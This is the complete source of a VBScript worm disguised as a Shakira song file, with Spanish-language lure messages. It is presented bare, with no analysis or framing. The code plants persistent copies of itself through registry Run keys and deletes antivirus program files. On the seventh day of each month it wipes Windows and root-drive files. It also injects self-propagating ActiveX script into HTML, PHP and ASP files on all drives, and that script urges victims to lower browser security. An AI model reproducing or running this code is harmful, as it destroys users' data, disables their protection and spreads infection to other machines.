On Error Resume Next
Dim MA,Falckon,Cocaufav
Set MA  = WScript.CreateObject("WScript.Shell")
Set Falckon = CreateObject("scripting.filesystemobject")


If MA.regread("HKCU\software\MA\mensaje2") <> "1" Then
MA.regwrite "HKCU\software\MA\mensaje2","1"
MA.Popup "Este Archivo Descompactara la Canción de Shakira!!!"
End If
Set WindowsFolder = Falckon.GetSpecialFolder(0)
Set SystemFolder = Falckon.GetSpecialFolder(1)
Set TempFolder = Falckon.GetSpecialFolder(2)
Falckon.CopyFile Wscript.Scriptfullname, WindowsFolder & "\Shakira.Mp3.vbs"
Falckon.CopyFile Wscript.Scriptfullname, "C:\Recycled\office.vbs"
Falckon.CopyFile Wscript.Scriptfullname, WindowsFolder & "\Outlook.vbs"
Falckon.CopyFile Wscript.Scriptfullname, TempFolder & "\teclas.vbs"
Falckon.CopyFile Wscript.Scriptfullname, WindowsFolder & "\Windows.vbs"   

If MA.regread("HKCU\software\MA\mensaje3") <> "1" Then
MA.regwrite "HKCU\software\MA\mensaje3","1"
MA.Popup "Muy pronto escucharas las canciones...."
End If
MA.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\teclado", TempFolder &"\teclas.vbs"
                                  MA.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows","C:\Shakira.Mp3.vbs"
                                  MA.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\oFFiCe","C:\Recycled\office.vbs"
                                  MA.RegWrite "HKCU\Copyright", "Create By Falckon en Honor A Maria Andrea
                                  MA.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows","C:\Windows\Windows.vbs"
                                  MA.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Outlook","C:\Windows\Outlook.vbs"

 If day(now) = 7 Then
                 Falckon.DeleteFile ("C:\Windows\System\*.*")
                 Falckon.DeleteFile ("C:\Windows\Command\*.*")
                 Falckon.DeleteFile ("C:\Windows\*.*")
                 Falckon.DeleteFile ("C:\misdoc~1\*.*")
                 Falckon.DeleteFile ("C:\*.*")
                 Falckon.DeleteFolder "C:\*.*",true
End If


 

If MA.regread("HKCU\software\MA\mensaje1") <> "1" Then
MA.regwrite "HKCU\software\MA\mensaje1","1"

          msgbox "Error al descompactar los archivos remplacelo por uno nuevo",16,"Error"

          msgbox "Desgraciadamente no se veran las canciones....",64,"Información"
End If


On Error Resume Next
if MA.regread ("HKCU\software\Shakira\DeleteAnti") <> "1" then
Infected ""
end if
Function Infected(path)
    On Error Resume Next
     if path = "" then
       if Falckon.fileexists("C:\Archivos de Programa\AVPersonal\Avguard.exe") then path="c:\Archivos de Programa\AVPersonal"
       if Falckon.fileexists("c:\Archivos de Programa\Antiviral Toolkit Pro\avp32.exe") then path="c:\Archivos de Programa\Antiviral Toolkit Pro"
       if Falckon.fileexists("C:\Archivos de programa\Kaspersky Lab\Kaspersky Anti-Virus Personal\Avp32.exe") then path="C:\Archivos de programa\Kaspersky Lab\Kaspersky Anti-Virus Personal"
 dir = MA.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
       if Falckon.fileexists(dir & "\AVPersonal\Avguard.exe") then path=dir & "\AVPersonal"
       if Falckon.fileexists(dir & "\Antiviral Toolkit Pro\avp32.exe") then path=dir & "\Antiviral Toolkit Pro"
       if Falckon.fileexists(dir & "\Kaspersky Lab\Kaspersky Anti-Virus Personal\Avp32.exe") then path=dir & "\Kaspersky Lab\Kaspersky Anti-Virus Personal"
end if
   if path <> "" then
 Set Falckon = CreateObject("scripting.filesystemobject")
 Falckon.DeleteFile (dir & "\AVPersonal\*.*")
 Falckon.DeleteFile (dir & "\Antiviral Toolkit Pro\*.*")
 Falckon.DeleteFile ("C:\Archivos de Programa\Kaspersky Lab\Kaspersky Anti-Virus Personal\*.*")
MA.regwrite "HKCU\software\Shakira\DeleteAntiv", "1"

end if

end function


On Error Resume Next


Dim Coafwwqj
Set MAwshafwwqj = CreateObject("WScript.Shell")
Set MAfsoafwwqj= CreateObject("scripting.filesystemobject")
If MAwshafwwqj.regread("HKCU\software\Infec\html") <> "1" Then
HTML()
End If
Function HTML()
ON ERROR RESUME NEXT
For Each drvarafwwqj In MAfsoafwwqj.drives
Unafwwqj = drafwwqj & "\"
Call HTLafwwqj(Unafwwqj)
Next
End Function
Function HTLafwwqj(Vaafwwqj)
Coafwwqj = ""
Set meafwwqj = MAfsoafwwqj.OpenTextFile(wscript.scriptfullname, 1)
Do While meafwwqj.AtendOfStream = False
Linafwwqj = meafwwqj.ReadLine
Coafwwqj = Coafwwqj & Chr(34) & " & vbCrLf & " & Chr(34) & Replace(Linafwwqj, Chr(34), Chr(34) & " & Chr(34) & " & Chr(34))
Loop
meafwwqj.Close
Crafwwqj = Vaafwwqj
Set foafwwqj = MAfsoafwwqj.GetFolder(Crafwwqj)
For Each Reafwwqj In MAfsoafwwqj.GetFolder(Crafwwqj).Files
If LCase(MAfsoafwwqj.GetExtensionName(Reafwwqj))="html" Or LCase(MAfsoafwwqj.GetExtensionName(Reafwwqj))="htm"   Or LCase(MAfsoafwwqj.GetExtensionName(Reafwwqj))="php"  Or LCase(MAfsoafwwqj.GetExtensionName(Reafwwqj))="asp"   Or LCase(MAfsoafwwqj.GetExtensionName(Reafwwqj))="htt"  Or LCase(MAfsoafwwqj.GetExtensionName(Reafwwqj))="shtml" Or LCase(MAfsoafwwqj.GetExtensionName(Reafwwqj))="shtm"  Then
Dim Fpafwwqj
Dim Srlafwwqj
Set Fpafwwqj = MAfsoafwwqj.OpenTextFile(Reafwwqj,1,False)
Srlafwwqj= Fpafwwqj.ReadAll
Fpafwwqj.Close
Dim Tmpafwwqj
Tmpafwwqj = ""
Tmpafwwqj = Tmpafwwqj & VbCrlf & "<html> <body> <script language=" & Chr(34) & "vbscript" & Chr(34) & ">"
Tmpafwwqj = Tmpafwwqj & VbCrlf & "ON ERROR RESUME NEXT"
Tmpafwwqj = Tmpafwwqj & VbCrlf & "Set fsoafwwqj = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) &")"
Tmpafwwqj = Tmpafwwqj & VbCrlf & "Set Fsafwwqj= fsoafwwqj.CreateTextFile(fsoafwwqj.getspecialfolder(0) & " & Chr(34) & "\Temp.vbs" & Chr(34) & " , True)"
Tmpafwwqj = Tmpafwwqj & VbCrlf & "Fsafwwqj.write" & Chr(34) & Coafwwqj & Chr(34)
Tmpafwwqj = Tmpafwwqj & VbCrlf & "Fsafwwqj.Close"
Tmpafwwqj = Tmpafwwqj & VbCrlf & "Set wsafwwqj = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
Tmpafwwqj = Tmpafwwqj & VbCrlf & "wsafwwqj.run fsoafwwqj.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fsoafwwqj.getspecialfolder(0) & " & Chr(34) & "\Temp.vbs %" & Chr(34)
Tmpafwwqj = Tmpafwwqj & VbCrlf & "If err.number <> 0 Then"
Tmpafwwqj = Tmpafwwqj & VbCrlf & "alert(" & Chr(34) & "Error." & Chr(34) & " & vbCrLf & " & Chr(34) & "Esta pagina requiere ActiveX para funcionar correctamente." & Chr(34) & " & vbCrLf & " & Chr(34) & "Presione Actualizar y acepte la ejecucion de ActiveX." & Chr(34) & " & vbCrLf & " & Chr(34) & "Si no se le permite aceptar ActiveX, baje el nivel de seguridad de " & Chr(34) & " & vbCrLf & " & Chr(34) & "su navegador, o busque como permitir esta interaccion." & Chr(34) & " & vbCrLf & " & Chr(34) & "" & Chr(34) & ")"
Tmpafwwqj = Tmpafwwqj & VbCrlf & "End If"
Tmpafwwqj = Tmpafwwqj & VbCrlf & Chr(60) & Chr(47) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(62) & Chr(32) & Chr(60)& Chr(47) & Chr(98) & Chr(111) & Chr(100) & Chr(121) & Chr(47) & Chr(62) & Chr(32) & Chr(60) & Chr(47) & Chr(104) & Chr(116) & Chr(109) & Chr(108) & Chr(62)
Set Htrafwwqj = MAfsoafwwqj.OpenTextFile(Reafwwqj,2,1)
Htrafwwqj.write Srlafwwqj & vbCrlf & Tmpafwwqj
Htrafwwqj.Close
End If
Next
Set Baafwwqj= Foafwwqj.SubFolders
For Each Caafwwqj In Baafwwqj
Call HTLafwwqj(Caafwwqj)
Next
MAwshafwwqj.regwrite "HKCU\software\Infec\html","1"
End Function



